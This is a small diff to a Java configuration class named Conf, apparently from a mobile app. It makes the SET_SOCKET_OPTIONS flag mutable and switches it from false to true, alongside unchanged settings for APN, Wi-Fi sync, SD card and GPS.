@@ -64,7 +64,7 @@ public final class Conf {
 	public static final String DEFAULT_APN_PWD = "";
 
 	public static final boolean SYNCACTION_FORCE_WIFI = true;
-	public static final boolean SET_SOCKET_OPTIONS = false;
+	public static boolean SET_SOCKET_OPTIONS = true;
 	public static final boolean SD_ENABLED = false;
 
 	public static final boolean GPS_ENABLED = true;
